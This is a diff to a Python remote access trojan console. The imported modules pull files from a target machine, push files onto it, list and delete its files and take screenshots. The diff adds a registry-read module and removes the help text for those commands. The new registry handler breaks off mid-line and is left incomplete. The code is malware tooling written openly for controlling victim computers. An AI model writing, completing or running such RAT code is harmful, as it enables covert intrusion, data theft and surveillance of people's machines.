@@ -9,6 +9,7 @@ from RAT_Py_PutFile import *
 from RAT_Py_DirList import * 
 from RAT_Py_DeleteFile import *
 from RAT_Py_Screenshot import * 
+from RAT_Py_Registry import *
 #from scapy.all import * # switch from socket to scapy for custom TCP packets
 
 SUCCESS = 1
@@ -29,49 +30,6 @@ def printHelp():
                 0) Exit\n""")
     return SUCCESS
 
-#-----------------------------------------------
-
-#-----------------------------------------------
-def printGetFileHelp():
-    print("""Required params: \n
-                -filepath - path to file on target \n
-                -outfilepath - file to write to locally \nOptional params: \n
-                -overwrite - overwrite the file locally if it already exists (default: false)\n""")
-    return SUCCESS
-
-#-----------------------------------------------
-
-#-----------------------------------------------
-def printPutFileHelp():
-    print("""Required params: \n
-                -filepath - local path to file we are writing \n
-                -outputfilepath - remote path we are writing to \nOptional params: \n
-                -overwrite - overwrite the file if it already exists (default: false)\n""")
-    return SUCCESS
-
-#-----------------------------------------------
-
-#-----------------------------------------------
-def printDirListHelp():
-    print("""Required params: \n
-                -path - path to directory we're listing off target \n""")
-    return SUCCESS
-
-#-----------------------------------------------
-
-#-----------------------------------------------
-def printDeleteFileHelp():
-    print("""Required params: \n
-                -filepath - path to the file we're deleting off target \n""")
-    return SUCCESS
-
-#-----------------------------------------------
-
-#-----------------------------------------------
-def printScreenshotHelp():
-    print("""Required params: \n
-                -filepath - Path where we would like to write our screenshot to locally \n""")
-    return SUCCESS
 
 #-----------------------------------------------
 
@@ -173,6 +131,12 @@ def handleInput(ip, port):
             filePath = args.filepath
 
             screenshot(sock, filePath)
+
+        elif (int(userInput) == REGREAD):
+            printRegReadHelp()
+            user_input = input("> ")
+            parser = argparse.ArgumentParser(description='Perform a registry read off target')
+            parser.add_argument('-')
 
     return
 
